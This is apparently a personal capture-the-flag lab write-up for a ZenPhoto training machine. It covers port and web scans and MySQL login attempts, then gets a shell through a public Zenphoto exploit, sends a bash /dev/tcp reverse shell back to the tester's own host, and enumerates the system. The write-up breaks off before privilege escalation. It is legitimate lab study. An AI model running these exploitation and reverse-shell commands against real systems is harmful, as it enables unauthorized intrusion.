**Metadata**

- IP Address:  192.168.162.41
- Hostname: offsecsrv
- OS: 	Ubuntu 10.04.3 
- Found Credentials/Users:

Main Objectives:

Local.txt = 90f7dc29c301d2478ebd085cee8f1e46
Proof.txt = 

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.162.41 -oN - 
# Nmap 7.95 scan initiated Sun Jan 18 10:24:44 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.162.41
Nmap scan report for 192.168.162.41
Host is up (0.086s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql

[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.162.41 -oN /home/kali/ProvingGround/ZenPhoto/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/ZenPhoto/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 10:24 MST
Nmap scan report for 192.168.162.41
Host is up (0.085s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[+] Running: Nmap MEDIUM UDP (top 1000 + bounded)
[+] Command: nmap -sU -Pn -n --top-ports 1000 -T4 --open -sV --version-intensity 5 --max-retries 1 --host-timeout 20m 192.168.162.41 -oN /home/kali/ProvingGround/ZenPhoto/nmap/medium_udp.nmap -oG /home/kali/ProvingGround/ZenPhoto/nmap/medium_udp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 10:37 MST
Warning: 192.168.162.41 giving up on port because retransmission cap hit (1).
Nmap scan report for 192.168.162.41
Host is up (0.080s latency).
Skipping host 192.168.162.41 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1203.43 seconds

```

2. Interesting Ports/Services

```

```

3. SSH Enumeration

```
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)


```

3. Telnet Enumeration

```
23/tcp   open  ipp     CUPS 1.4
https://www.exploit-db.com/exploits/34152

23/tcp   open  ssl/ipp CUPS 1.4
|_http-title: 403 Forbidden
|_ssl-date: 2026-01-18T22:58:57+00:00; +5h00m03s from scanner time.
| http-methods: 
|_  Potentially risky methods: PUT
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2011-11-08T07:15:46
|_Not valid after:  2021-11-05T07:15:46
|_http-server-header: CUPS/1.4

telnet 192.168.162.41
Trying 192.168.162.41...
Connected to 192.168.162.41.
Escape character is '^]'.
Connection closed by foreign host.


```

4. Web Enumeration 

```
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)

Webserver Info - Apache httpd 2.2.14 
Applications Running -
1. zenphoto version 1.4.1.4

Site Visit - 
1. Site say under construction. 
2. Found http://192.168.162.41/test/zp-core/admin.php
   
Possible Vulmerabilities - 
3. https://www.exploit-db.com/exploits/18083
   
[+] Running: Gobuster BASIC (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/.hta                 (Status: 403) [Size: 286]
/index                (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> http://192.168.162.41/test/]
/server-status        (Status: 403) [Size: 295]

[+] Running: Gobuster ADVANCED (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> 
/server-status        (Status: 403) [Size: 295]
Progress: 220460 / 220558 (99.96%)
===============================================================
Finished

[+] Running: Gobuster FILE search (80)
[+] Command: gobuster dir -u http://192.168.162.41:80 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/ZenPhoto/gobuster/ZenPhoto_192.168.162.41_80_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.162.41:80
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              jsp,html,txt,bak,zip,php,asp,aspx,old,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 286]
/.hta.bak             (Status: 403) [Size: 290]
/.hta.jsp             (Status: 403) [Size: 290]
/.hta.html            (Status: 403) [Size: 291]
/.hta.php             (Status: 403) [Size: 290]
/.hta.zip             (Status: 403) [Size: 290]
/.hta.txt             (Status: 403) [Size: 290]
/.hta.old             (Status: 403) [Size: 290]
/.hta.asp             (Status: 403) [Size: 290]
/.hta.aspx            (Status: 403) [Size: 291]
/.hta.tar             (Status: 403) [Size: 290]
/.hta.tar.gz          (Status: 403) [Size: 293]
/.htaccess            (Status: 403) [Size: 291]
/.htaccess.bak        (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 295]
/.htpasswd.zip        (Status: 403) [Size: 295]
/.htpasswd.aspx       (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 291]
/.htpasswd.old        (Status: 403) [Size: 295]
/.htaccess.txt        (Status: 403) [Size: 295]
/.htaccess.jsp        (Status: 403) [Size: 295]
/.htaccess.tar.gz     (Status: 403) [Size: 298]
/.htpasswd.asp        (Status: 403) [Size: 295]
/.htaccess.html       (Status: 403) [Size: 296]
/.htaccess.zip        (Status: 403) [Size: 295]
/.htpasswd.jsp        (Status: 403) [Size: 295]
/.htpasswd.tar        (Status: 403) [Size: 295]
/.htpasswd.txt        (Status: 403) [Size: 295]
/.htpasswd.html       (Status: 403) [Size: 296]
/.htpasswd.tar.gz     (Status: 403) [Size: 298]
/.htaccess.aspx       (Status: 403) [Size: 296]
/.htpasswd.bak        (Status: 403) [Size: 295]
/.htaccess.asp        (Status: 403) [Size: 295]
/.htaccess.tar        (Status: 403) [Size: 295]
/.htaccess.old        (Status: 403) [Size: 295]
/.htaccess.php        (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 290]
/cgi-bin/.html        (Status: 403) [Size: 295]
/index                (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/server-status        (Status: 403) [Size: 295]
/test                 (Status: 301) [Size: 315] [--> http://192.168.162.41/test/]
Progress: 55190 / 55356 (99.70%)
Progress: 55356 / 55356 (100.00%)===============================================================
Finished

[+] Running: Nikto (80)
[+] Command: nikto -h http://192.168.162.41:80 -output /home/kali/ProvingGround/ZenPhoto/web/192.168.162.41_80/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.162.41
+ Target Hostname:    192.168.162.41
+ Target Port:        80
+ Start Time:         2026-01-18 10:53:04 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/2.2.14 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 135479, size: 75, mtime: Wed Nov  9 04:30:14 2011. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
T+ /test/: Cookie zenphoto_auth created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /test/: Cookie zenphoto_ssl created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /test/: Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.10.
+ /test/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8909 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2026-01-18 11:05:25 (GMT-7) (741 seconds)


```

5. MSQL Enumeration

```
nmap -p 3306 -sV -sC 192.168.162.41

nmap -p 3306 --script=mysql-info,mysql-enum,mysql-databases,mysql-users,mysql-variables,mysql-empty-password,mysql-brute <target>

mysql -h 192.168.162.41 -u root -p                             
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root --password=""
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u admin -padmin
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u test -ptest
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root -proot

ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u root -ppassword
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

mysql -h <target> -u '' --password=''
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '192.168.45.151' is not allowed to connect to this MySQL server

```

6. Possible Exploits

```
 https://www.exploit-db.com/exploits/18083
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps
- Downloaded exploit from  https://www.exploit-db.com/exploits/18083.
- Viewed usage	

![[Pasted image 20260118165905.png]]

- Ran the exploit and received shell

```
php 18083.php 192.168.162.41 /test/
```

![[Pasted image 20260118170056.png]]

- Upgraded shell using Penelope by sending reverse shell back to my Kali machine.

```
zenphoto-shell# bash -c '0<&47-;exec 47<>/dev/tcp/192.168.45.151/443;sh <&47 >&47 2>&47'
```

![[Pasted image 20260118170405.png]]

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
[+] whoami
$ whoami
www-data

[+] id
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] hostname
$ hostname
offsecsrv

[+] pwd
$ pwd
/tmp

[+] uname -a
$ uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux

[+] os-release / issue
$ cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null
Ubuntu 10.04.3 LTS \n \l


```

2. Environment

```
[+] env
$ env
APACHE_PID_FILE=/var/run/apache2.pid
APACHE_RUN_USER=www-data
SHELL=/bin/bash
TERM=xterm-256color
PATH=/usr/local/bin:/usr/bin:/bin
_=/usr/bin/env
PWD=/tmp
APACHE_RUN_GROUP=www-data
LANG=C
SHLVL=4

[+] set (first 50)
$ set 2>/dev/null | head -n 50
APACHE_PID_FILE=/var/run/apache2.pid
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
BASH=/bin/bash
BASHOPTS=cmdhist:extquote:force_fignore:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=()
BASH_ARGV=()
BASH_CMDS=()
BASH_EXECUTION_STRING='set 2>/dev/null | head -n 50'
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="4" [1]="1" [2]="5" [3]="1" [4]="release" [5]="i486-pc-linux-gnu")
BASH_VERSION='4.1.5(1)-release'
DIRSTACK=()
EUID=33
GROUPS=()
HOSTNAME=offsecsrv
HOSTTYPE=i486
IFS=$' \t\n'
LANG=C
MACHTYPE=i486-pc-linux-gnu
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/bin:/usr/bin:/bin
PPID=1961
PS4='+ '
PWD=/tmp
SHELL=/bin/bash
SHELLOPTS=braceexpand:hashall:interactive-comments
SHLVL=4
TERM=xterm-256color
UID=33
_=/bin/bash

[+] PATH
$ echo "$PATH"
/usr/local/bin:/usr/bin:/bin

[+] HOME and SHELL
$ echo "HOME=$HOME"; echo "SHELL=$SHELL"
HOME=
SHELL=/bin/bash


```

3. User & Home Directories

```
[+] /etc/passwd
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:107::/var/run/dbus:/bin/false
avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash
speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false
haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false
saned:x:112:118::/home/saned:/bin/false
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:116:123:MySQL Server,,,:/var/lib/mysql:/bin/false

[+] home directories
$ ls -la /home
total 12
drwxr-xr-x  2 root     root     4096 Jul  9  2020 .
drwxr-xr-x 22 root     root     4096 Mar 18  2025 ..
-rw-r--r--  1 www-data www-data   33 Jan 20 18:08 local.txt

[+] root home (if accessible)
$ ls -la /root 2>/dev/null

[+] sudo -l
$ sudo -l 2>/dev/null
[sudo] password for www-data: 
[sudo] password for www-data: 
[sudo] password for www-data: 

[+] sudo -V (first 10)
$ sudo -V 2>/dev/null | head -n 10
Sudo version 1.7.2p1

```

4. Writable Paths & Permissions

```
[+] world-writable directories (first 50)
$ find / -writable -type d 2>/dev/null | head -n 50
/var/lock
/var/lock/apache2
/var/crash
/var/cache/apache2
/var/cache/apache2/mod_disk_cache
/var/lib/php5
/var/tmp
/dev/shm
/tmp
/proc/1991/task/1991/fd
/proc/1991/fd

[+] world-writable files (first 50)
$ find / -writable -type f 2>/dev/null | head -n 50
/usr/bin/changeip
/home/local.txt
/tmp/privesc_2026-01-20_181504.txt
/tmp/pg_privesc.sh
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate
/proc/2/task/2/attr/current
/proc/2/task/2/attr/exec
/proc/2/task/2/attr/fscreate
/proc/2/task/2/attr/keycreate
/proc/2/task/2/attr/sockcreate
/proc/2/attr/current
/proc/2/attr/exec
/proc/2/attr/fscreate
/proc/2/attr/keycreate
/proc/2/attr/sockcreate
/proc/3/task/3/attr/current
/proc/3/task/3/attr/exec
/proc/3/task/3/attr/fscreate
/proc/3/task/3/attr/keycreate
/proc/3/task/3/attr/sockcreate
/proc/3/attr/current
/proc/3/attr/exec
/proc/3/attr/fscreate
/proc/3/attr/keycreate
/proc/3/attr/sockcreate
/proc/4/task/4/attr/current
/proc/4/task/4/attr/exec
/proc/4/task/4/attr/fscreate
/proc/4/task/4/attr/keycreate
/proc/4/task/4/attr/sockcreate
/proc/4/attr/current
/proc/4/attr/exec
/proc/4/attr/fscreate
/proc/4/attr/keycreate
/proc/4/attr/sockcreate
/proc/5/task/5/attr/current
/proc/5/task/5/attr/exec
/proc/5/task/5/attr/fscreate
/proc/5/task/5/attr/keycreate
/proc/5/task/5/attr/sockcreate
/proc/5/attr/current

[+] PATH entries + writable check
$ echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
OK: /usr/local/bin
OK: /usr/bin
OK: /bin

[+] files owned by current user (first 50)
$ find / -user "www-data" -type f 2>/dev/null | head -n 50
/home/local.txt
/tmp/privesc_2026-01-20_181504.txt
/tmp/pg_privesc.sh
/proc/1918/task/1918/environ
/proc/1918/task/1918/auxv
/proc/1918/task/1918/status
/proc/1918/task/1918/personality
/proc/1918/task/1918/limits
/proc/1918/task/1918/sched
/proc/1918/task/1918/syscall
/proc/1918/task/1918/cmdline
/proc/1918/task/1918/stat
/proc/1918/task/1918/statm
/proc/1918/task/1918/maps
/proc/1918/task/1918/mem
/proc/1918/task/1918/mounts
/proc/1918/task/1918/mountinfo
/proc/1918/task/1918/clear_refs
/proc/1918/task/1918/smaps
/proc/1918/task/1918/pagemap
/proc/1918/task/1918/attr/current
/proc/1918/task/1918/attr/prev
/proc/1918/task/1918/attr/exec
/proc/1918/task/1918/attr/fscreate
/proc/1918/task/1918/attr/keycreate
/proc/1918/task/1918/attr/sockcreate
/proc/1918/task/1918/wchan
/proc/1918/task/1918/stack
/proc/1918/task/1918/schedstat
/proc/1918/task/1918/latency
/proc/1918/task/1918/cpuset
/proc/1918/task/1918/cgroup
/proc/1918/task/1918/oom_score
/proc/1918/task/1918/oom_adj
/proc/1918/task/1918/loginuid
/proc/1918/task/1918/sessionid
/proc/1918/task/1918/io
/proc/1918/fdinfo/0
/proc/1918/fdinfo/1
/proc/1918/fdinfo/2
/proc/1918/environ
/proc/1918/auxv
/proc/1918/status
/proc/1918/personality
/proc/1918/limits
/proc/1918/sched
/proc/1918/syscall
/proc/1918/cmdline
/proc/1918/stat
/proc/1918/statm

[+] /etc/passwd perms
$ ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 1671 Nov  9  2011 /etc/passwd

[+] /etc/shadow perms
$ ls -l /etc/shadow 2>/dev/null
-rw-r----- 1 root shadow 1041 Mar 24  2020 /etc/shadow

[+] root dir perms
$ ls -la / 2>/dev/null
total 108
drwxr-xr-x  22 root root  4096 Mar 18  2025 .
drwxr-xr-x  22 root root  4096 Mar 18  2025 ..
-rw-------   1 root root    23 Mar 23  2020 .bash_history
drwxr-xr-x   2 root root  4096 Nov  8  2011 bin
drwxr-xr-x   3 root root  4096 Feb 27  2015 boot
drwxr-xr-x   2 root root  4096 Nov  8  2011 cdrom
drwxr-xr-x  14 root root  3480 Mar 18  2025 dev
drwxr-xr-x 131 root root 12288 Mar 18  2025 etc
drwxr-xr-x   2 root root  4096 Jul  9  2020 home
lrwxrwxrwx   1 root root    33 Nov  9  2011 initrd.img -> boot/initrd.img-2.6.32-21-generic
lrwxrwxrwx   1 root root    33 Nov  8  2011 initrd.img.old -> boot/initrd.img-2.6.32-33-generic
drwxr-xr-x  20 root root 12288 Nov  8  2011 lib
drwx------   2 root root 16384 Nov  8  2011 lost+found
drwxr-xr-x   3 root root  4096 Jul 19  2011 media
drwxr-xr-x   2 root root  4096 Apr 23  2010 mnt
drwxr-xr-x   2 root root  4096 Jul 19  2011 opt
dr-xr-xr-x  98 root root     0 Mar 18  2025 proc
drwx------   5 root root  4096 Jan 20 13:08 root
drwxr-xr-x   2 root root  4096 Feb 27  2015 sbin
drwxr-xr-x   2 root root  4096 Dec  5  2009 selinux
drwxr-xr-x   2 root root  4096 Jul 19  2011 srv
drwxr-xr-x  12 root root     0 Mar 18  2025 sys
drwxrwxrwt   3 root root  4096 Jan 20 18:15 tmp
drwxr-xr-x  10 root root  4096 Jul 19  2011 usr
drwxr-xr-x  16 root root  4096 Nov  9  2011 var
lrwxrwxrwx   1 root root    30 Nov  9  2011 vmlinuz -> boot/vmlinuz-2.6.32-21-generic
lrwxrwxrwx   1 root root    30 Nov  8  2011 vmlinuz.old -> boot/vmlinuz-2.6.32-33-generic


```

4. SUID / SGID / Capabilities

```
[+] SUID binaries
$ find / -perm -4000 -type f 2>/dev/null
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
/bin/ping
/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/lppasswd
/usr/bin/chfn
/usr/bin/mtr
/usr/bin/X
/usr/bin/sudoedit
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/arping
/usr/bin/at
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/sbin/pppd
/usr/sbin/uuidd

[+] SGID binaries
$ find / -perm -2000 -type f 2>/dev/null
/usr/bin/wall
/usr/bin/crontab
/usr/bin/ssh-agent
/usr/bin/mail-lock
/usr/bin/screen
/usr/bin/expiry
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/X
/usr/bin/mail-unlock
/usr/bin/mlocate
/usr/bin/dotlockfile
/usr/bin/at
/usr/bin/mail-touchlock
/usr/bin/xterm
/usr/lib/evolution/camel-lock-helper-1.2
/usr/lib/libvte9/gnome-pty-helper
/usr/games/mahjongg
/usr/games/quadrapassel
/usr/games/gnomine
/usr/sbin/uuidd
/sbin/unix_chkpwd

[+] setcap
$ getcap -r / 2>/dev/null

```

5. Cron & Scheduled Tasks

```
[+] /etc/crontab
$ cat /etc/crontab 2>/dev/null
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#



[+] /etc/cron.*
$ ls -la /etc/cron.* 2>/dev/null
/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Nov  9  2011 .
drwxr-xr-x 131 root root 12288 Mar 18  2025 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rw-r--r--   1 root root   288 Mar  4  2010 anacron
-rw-r--r--   1 root root   499 Oct 14  2011 php5

/etc/cron.daily:
total 80
drwxr-xr-x   2 root root  4096 Nov  9  2011 .
drwxr-xr-x 131 root root 12288 Mar 18  2025 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   311 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   633 Sep  1  2011 apache2
-rwxr-xr-x   1 root root   189 Apr 19  2010 apport
-rwxr-xr-x   1 root root 15914 May 30  2011 apt
-rwxr-xr-x   1 root root   314 Apr  9  2010 aptitude
-rwxr-xr-x   1 root root   502 Nov 10  2009 bsdmainutils
-rwxr-xr-x   1 root root   256 Apr 15  2010 dpkg
-rwxr-xr-x   1 root root    89 Mar  6  2010 logrotate
-rwxr-xr-x   1 root root  1327 Oct  5  2010 man-db
-rwxr-xr-x   1 root root   606 Mar 24  2010 mlocate
-rwxr-xr-x   1 root root  2149 Jun 16  2009 popularity-contest
-rwxr-xr-x   1 root root  3349 Apr 14  2010 standard

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 18  2025 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder

/etc/cron.monthly:
total 28
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 18  2025 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   313 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   129 Apr 14  2010 standard

/etc/cron.weekly:
total 32
drwxr-xr-x   2 root root  4096 Jul 19  2011 .
drwxr-xr-x 131 root root 12288 Mar 18  2025 ..
-rw-r--r--   1 root root   102 Apr 14  2010 .placeholder
-rwxr-xr-x   1 root root   312 Mar  4  2010 0anacron
-rwxr-xr-x   1 root root   203 Mar 30  2010 apt-xapian-index
-rwxr-xr-x   1 root root   887 Oct  5  2010 man-db


```

6. Processes & Network

```
[+] ps -ef
$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 17:35 ?        00:00:00 /sbin/init
root         2     0  0 17:35 ?        00:00:00 [kthreadd]
root         3     2  0 17:35 ?        00:00:00 [migration/0]
root         4     2  0 17:35 ?        00:00:00 [ksoftirqd/0]
root         5     2  0 17:35 ?        00:00:00 [watchdog/0]
root         6     2  0 17:35 ?        00:00:00 [events/0]
root         7     2  0 17:35 ?        00:00:00 [cpuset]
root         8     2  0 17:35 ?        00:00:00 [khelper]
root         9     2  0 17:35 ?        00:00:00 [netns]
root        10     2  0 17:35 ?        00:00:00 [async/mgr]
root        11     2  0 17:35 ?        00:00:00 [pm]
root        12     2  0 17:35 ?        00:00:00 [sync_supers]
root        13     2  0 17:35 ?        00:00:00 [bdi-default]
root        14     2  0 17:35 ?        00:00:00 [kintegrityd/0]
root        15     2  0 17:35 ?        00:00:00 [kblockd/0]
root        16     2  0 17:35 ?        00:00:00 [kacpid]
root        17     2  0 17:35 ?        00:00:00 [kacpi_notify]
root        18     2  0 17:35 ?        00:00:00 [kacpi_hotplug]
